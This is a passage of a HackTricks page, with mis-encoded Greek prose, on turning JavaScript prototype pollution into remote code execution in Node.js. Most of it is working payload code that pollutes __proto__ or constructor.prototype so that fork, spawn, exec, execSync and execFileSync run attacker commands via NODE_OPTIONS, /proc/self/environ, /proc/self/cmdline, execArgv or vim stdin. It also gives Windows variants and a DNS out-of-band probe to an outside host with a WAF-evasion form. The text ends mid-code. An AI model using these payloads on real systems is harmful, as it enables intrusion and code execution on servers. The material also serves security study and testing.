# Î ÏÏ‰Ï„ÏŒÏ„Ï…Ï€Î· Î”Î¹Î±ÏÏÎ¿Î® ÏƒÎµ RCE

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>

## Î•Ï…Î¬Î»Ï‰Ï„Î¿Ï‚ ÎšÏÎ´Î¹ÎºÎ±Ï‚

Î¦Î±Î½Ï„Î±ÏƒÏ„ÎµÎ¯Ï„Îµ Î­Î½Î±Î½ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒ JS Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ ÎºÎ¬Ï€Î¿Î¹Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± ÏŒÏ€Ï‰Ï‚ Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰:
```javascript
const { execSync, fork } = require('child_process');

function isObject(obj) {
console.log(typeof obj);
return typeof obj === 'function' || typeof obj === 'object';
}

// Function vulnerable to prototype pollution
function merge(target, source) {
for (let key in source) {
if (isObject(target[key]) && isObject(source[key])) {
merge(target[key], source[key]);
} else {
target[key] = source[key];
}
}
return target;
}

function clone(target) {
return merge({}, target);
}

// Run prototype pollution with user input
// Check in the next sections what payload put here to execute arbitrary code
clone(USERINPUT);

// Spawn process, this will call the gadget that poputales env variables
// Create an a_file.js file in the current dir: `echo a=2 > a_file.js`
var proc = fork('a_file.js');
```
## PP2RCE Î¼Î­ÏƒÏ‰ Î¼ÎµÏ„Î±Î²Î»Î·Ï„ÏÎ½ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚

Î¤Î¿ **PP2RCE** ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ **Prototype Pollution to RCE** (Remote Code Execution).

Î£ÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ [**Î¬ÏÎ¸ÏÎ¿**](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/), ÏŒÏ„Î±Î½ Î­Î½Î± **Î´Î¹ÎµÏÎ³Î±ÏƒÎ¯Î± Î¾ÎµÎºÎ¹Î½Î¬** Î¼Îµ ÎºÎ¬Ï€Î¿Î¹Î± Î¼Î­Î¸Î¿Î´Î¿ Î±Ï€ÏŒ Ï„Î¿ **`child_process`** (ÏŒÏ€Ï‰Ï‚ `fork` Î® `spawn` Î® Î¬Î»Î»ÎµÏ‚), ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ `normalizeSpawnArguments` Î· Î¿Ï€Î¿Î¯Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î­Î½Î± **gadget Î³Î¹Î± Ï„Î·Î½ Ï€ÏÎ¿ÏƒÎ²Î¿Î»Î® Ï„Î¿Ï… Ï€ÏÏ‰Ï„Î¿Ï„ÏÏ€Î¿Ï…** Î³Î¹Î± Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Î½Î­Ï‰Î½ Î¼ÎµÏ„Î±Î²Î»Î·Ï„ÏÎ½ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚:
```javascript
//See code in https://github.com/nodejs/node/blob/02aa8c22c26220e16616a88370d111c0229efe5e/lib/child_process.js#L638-L686

var env = options.env || process.env;
var envPairs = [];
[...]
let envKeys = [];
// Prototype values are intentionally included.
for (const key in env) {
ArrayPrototypePush(envKeys, key);
}
[...]
for (const key of envKeys) {
const value = env[key];
if (value !== undefined) {
ArrayPrototypePush(envPairs, `${key}=${value}`); // <-- Pollution
}
}
```
Î•Î»Î­Î³Î¾Ï„Îµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ±, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î´Î·Î»Î·Ï„Î·ÏÎ¹Î¬ÏƒÎµÏ„Îµ Ï„Î¿ `envPairs` Î±Ï€Î»Î¬ Î¼Îµ Ï„Î¿Î½ Ï€ÏÎ¿ÏƒÎ²Î¬Î»Î»Î¿Î½Ï„Î± Ï„Î¿ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ `.env`.

### Î”Î·Î»Î·Ï„Î·ÏÎ¯Î±ÏƒÎ· `__proto__`

{% hint style="warning" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î»ÏŒÎ³Ï‰ Ï„Î¿Ï… Ï„ÏÏŒÏ€Î¿Ï… Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±Ï‚ Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ **`normalizeSpawnArguments`** Î±Ï€ÏŒ Ï„Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· **`child_process`** Ï„Î¿Ï… node, ÏŒÏ„Î±Î½ ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ ÎºÎ¬Ï„Î¹ Î³Î¹Î± Î½Î± **Î¿ÏÎ¯ÏƒÎµÎ¹ Î¼Î¹Î± Î½Î­Î± Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® env** Î³Î¹Î± Ï„Î· Î´Î¹ÎµÏÎ³Î±ÏƒÎ¯Î±, Î±Ï€Î»Î¬ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± **Î´Î·Î»Î·Ï„Î·ÏÎ¹Î¬ÏƒÎµÏ„Îµ Î¿Ï„Î¹Î´Î®Ï€Î¿Ï„Îµ**.\
Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î±Î½ ÎºÎ¬Î½ÎµÏ„Îµ `__proto__.avar="valuevar"` Î· Î´Î¹ÎµÏÎ³Î±ÏƒÎ¯Î± Î¸Î± Î¾ÎµÎºÎ¹Î½Î®ÏƒÎµÎ¹ Î¼Îµ Î¼Î¹Î± Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® Ï€Î¿Ï… Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ `avar` Î¼Îµ Ï„Î¹Î¼Î® `valuevar`.

Î©ÏƒÏ„ÏŒÏƒÎ¿, Î³Î¹Î± Î½Î± ÎµÎ¯Î½Î±Î¹ Î· **Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® env Î· Ï€ÏÏÏ„Î·** Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± **Î´Î·Î»Î·Ï„Î·ÏÎ¹Î¬ÏƒÎµÏ„Îµ** Ï„Î¿ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ **`.env`** ÎºÎ±Î¹ (Î¼ÏŒÎ½Î¿ ÏƒÎµ Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…Ï‚) Î±Ï…Ï„Î® Î· Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® Î¸Î± ÎµÎ¯Î½Î±Î¹ Î· **Ï€ÏÏÏ„Î·** (ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ·).

Î“Î¹' Î±Ï…Ï„ÏŒ Ï„Î¿ **`NODE_OPTIONS`** Î´ÎµÎ½ Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ **Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ `.env`** ÏƒÏ„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÏ€Î¯Î¸ÎµÏƒÎ·.
{% endhint %}

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce\\\").toString())//"}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

### Î”Î·Î»Î·Ï„Î·ÏÎ¯Î±ÏƒÎ· Ï„Î¿Ï… `constructor.prototype`
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.constructor.prototype.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"}
b.constructor.prototype.NODE_OPTIONS = "--require /proc/self/environ"

proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"constructor": {"prototype": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec2
```
## PP2RCE Î¼Î­ÏƒÏ‰ Î¼ÎµÏ„Î±Î²Î»Î·Ï„ÏÎ½ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ + Î³ÏÎ±Î¼Î¼Î®Ï‚ ÎµÎ½Ï„Î¿Î»ÏÎ½

Î ÏÎ¿Ï„Î¬Î¸Î·ÎºÎµ Î­Î½Î±Ï‚ Ï€Î±ÏÏŒÎ¼Î¿Î¹Î¿Ï‚ Ï†Î¿ÏÏ„Î¯Î¿Ï‚ Î¼Îµ Î±Î»Î»Î±Î³Î­Ï‚ ÏƒÏ„Î¿ [**ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ Î¬ÏÎ¸ÏÎ¿**](https://blog.sonarsource.com/blitzjs-prototype-pollution/)**.** ÎŸÎ¹ ÎºÏÏÎ¹ÎµÏ‚ Î´Î¹Î±Ï†Î¿ÏÎ­Ï‚ ÎµÎ¯Î½Î±Î¹:

* Î‘Î½Ï„Î¯ Î½Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÎ¹ Ï„Î¿ Ï†Î¿ÏÏ„Î¯Î¿ Ï„Î¿Ï… nodejs Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ `/proc/self/environ`, Ï„Î¿ Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÎ¹ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ **argv0** Ï„Î¿Ï… **`/proc/self/cmdline`**.
* Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î±Î½Ï„Î¯ Î½Î± Î±Ï€Î±Î¹Ï„ÎµÎ¯ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ `/proc/self/environ` Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ **`NODE_OPTIONS`**, Î±Ï€Î±Î¹Ï„ÎµÎ¯ Ï„Î¿ **`/proc/self/cmdline`**.

{% code overflow="wrap" %}
```javascript
const { execSync, fork } = require('child_process');

// Manual Pollution
b = {}
b.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/pp2rce2').toString())//"
b.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"

// Trigger gadget
var proc = fork('./a_file.js');
// This should create the file /tmp/pp2rec2


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce2\\\").toString())//"}}')

clone(USERINPUT);

var proc = fork('a_file.js');
// This should create the file /tmp/pp2rec
```
{% endcode %}

## Î‘Î»Î»Î·Î»ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ· Î¼Îµ Ï„Î¿ DNS

Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î± Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï†Î¿ÏÏ„Î¯Î±, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„Î¿ÏÎ¼Îµ Ï„Î· Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ NODE\_OPTIONS Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î¼Îµ ÏƒÏ…Î¶Î·Ï„Î®ÏƒÎµÎ¹ Ï€ÏÎ¿Î·Î³Î¿Ï…Î¼Î­Î½Ï‰Ï‚ ÎºÎ±Î¹ Î½Î± ÎµÎ»Î­Î³Î¾Î¿Ï…Î¼Îµ Î±Î½ Î»ÎµÎ¹Ï„Î¿ÏÏÎ³Î·ÏƒÎµ Î¼Îµ Î¼Î¹Î± Î±Î»Î»Î·Î»ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ· Î¼Îµ Ï„Î¿ DNS:
```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id.oastify.com"
}
}
```
Î‰, Î³Î¹Î± Î½Î± Î±Ï€Î¿Ï†ÎµÏ…Ï‡Î¸ÎµÎ¯ Î· Î±Î¯Ï„Î·ÏƒÎ· Ï„Î¿Ï… WAF Î³Î¹Î± Ï„Î¿Î½ Ï„Î¿Î¼Î­Î±:
```json
{
"__proto__": {
"argv0":"node",
"shell":"node",
"NODE_OPTIONS":"--inspect=id\"\".oastify\"\".com"
}
}
```
## Î•Ï…Ï€Î¬Î¸ÎµÎ¹Î± PP2RCE ÏƒÏ„Î¹Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚ child\_process

Î£Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ ÎµÎ½ÏŒÏ„Î·Ï„Î± Î¸Î± Î±Î½Î±Î»ÏÏƒÎ¿Ï…Î¼Îµ **ÎºÎ¬Î¸Îµ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Î±Ï€ÏŒ Ï„Î¿ `child_process`** Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î¼Îµ ÎºÏÎ´Î¹ÎºÎ± ÎºÎ±Î¹ Î½Î± Î´Î¿ÏÎ¼Îµ Î±Î½ Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î¼Îµ ÎºÎ¬Ï€Î¿Î¹Î± Ï„ÎµÏ‡Î½Î¹ÎºÎ® Î³Î¹Î± Î½Î± Î±Î½Î±Î³ÎºÎ¬ÏƒÎ¿Ï…Î¼Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ ÎºÏÎ´Î¹ÎºÎ±:

<details>

<summary><code>exec</code> ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·</summary>

{% code overflow="wrap" %}
```javascript
// environ trick - not working
// It's not possible to pollute the .env attr to create a first env var
// because options.env is null (not undefined)

// cmdline trick - working with small variation
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = exec('something');

// stdin trick - not working
// Not using stdin

// Windows
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = exec('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>execFile</code> ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·</strong></summary>
```javascript
// environ trick - not working
// It's not possible to pollute the .en attr to create a first env var

// cmdline trick - working with a big requirement
// Working after kEmptyObject (fix)
const { execFile } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFile-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFile('/usr/bin/node');

// stdin trick - not working
// Not using stdin

// Windows - not working
```
Î“Î¹Î± Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Ï„Î¿ **`execFile`**, **Î Î¡Î•Î Î•Î™ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¿ ÎºÏŒÎ¼Î²Î¿Ï‚** Î³Î¹Î± Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î½ Î¿Î¹ NODE\_OPTIONS.\
Î‘Î½ **Î´ÎµÎ½** ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¿ **ÎºÏŒÎ¼Î²Î¿Ï‚**, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï€ÏÏ‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·** Ï„Î¿Ï… ÏŒ,Ï„Î¹ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ **Î¼Îµ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚** ÎºÎ±Î¹ Î½Î± Ï„Î¹Ï‚ Î¿ÏÎ¯ÏƒÎµÏ„Îµ.

ÎŸÎ¹ **Î¬Î»Î»ÎµÏ‚** Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ **Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¿ÏÎ½** Ï‡Ï‰ÏÎ¯Ï‚ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Î±Ï€Î±Î¯Ï„Î·ÏƒÎ· ÎµÏ€ÎµÎ¹Î´Î® ÎµÎ¯Î½Î±Î¹ **Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯** Ï„Î¿ **Ï„Î¹ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹** Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ Ï€ÏÎ¿Ï„ÏÏ€Î¿Ï… Î¼ÏŒÎ»Ï…Î½ÏƒÎ·Ï‚. (Î£Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·, Î±ÎºÏŒÎ¼Î± ÎºÎ¹ Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î¼Î¿Î»ÏÎ½ÎµÏ„Îµ Ï„Î¿ `.shell`, Î´ÎµÎ½ Î¸Î± Î¼Î¿Î»ÏÎ½ÎµÏ„Îµ Î±Ï…Ï„ÏŒ Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹).

</details>

<details>

<summary>Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Ï„Î·Ï‚ <code>fork</code></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/fork-environ').toString())//"}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = fork('something');

// cmdline trick - working
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
p = {}
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/fork-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = fork('something');

// stdin trick - not working
// Not using stdin

// execArgv trick - working
// Only the fork method has this attribute
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "/bin/sh"
b.__proto__.argv0 = "/bin/sh"
b.__proto__.execArgv = ["-c", "touch /tmp/fork-execArgv"]
var proc = fork('./a_file.js');

// Windows
// Working after kEmptyObject (fix)
const { fork } = require('child_process');
b = {}
b.__proto__.execPath = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = fork('./a_file.js');
```
{% endcode %}

</details>

<details>

<summary><strong><code>ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· spawn</code></strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/spawn-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// cmdline trick - working with small variation (shell)
// NOT working after kEmptyObject (fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/spawn-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"/tmp"}); //To work after kEmptyObject (fix)


// stdin trick - not working
// Not using stdin

// Windows
// NOT working after require(fix) without options
const { spawn } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = spawn('something');
//var proc = spawn('something',[],{"cwd":"C:\\"}); //To work after kEmptyObject (fix)
```
{% endcode %}

</details>

<details>

<summary><strong><code>execFileSync</code> ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execFileSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execFileSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execFileSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execFileSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execFileSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execFileSync-stdin}\n'
var proc = execFileSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
p.__proto__.argv0 = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = execSync('something');
```
{% endcode %}

</details>

<details>

<summary><strong><code>execSync</code> ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·</strong></summary>

{% code overflow="wrap" %}
```javascript
// environ trick - working with small variation (shell and argv0)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
// If in windows or mac you need to change the following params to the path of ndoe
p.__proto__.argv0 = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.env = { "EVIL":"console.log(require('child_process').execSync('touch /tmp/execSync-environ').toString())//"}
p.__proto__.NODE_OPTIONS = "--require /proc/self/environ"
var proc = execSync('something');

// cmdline trick - working with small variation (shell)
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/execSync-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = execSync('something');

// stdin trick - working
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.argv0 = "/usr/bin/vim"
p.__proto__.shell = "/usr/bin/vim"
p.__proto__.input = ':!{touch /tmp/execSync-stdin}\n'
var proc = execSync('something');

// Windows
// Working after kEmptyObject (fix)
const { execSync } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
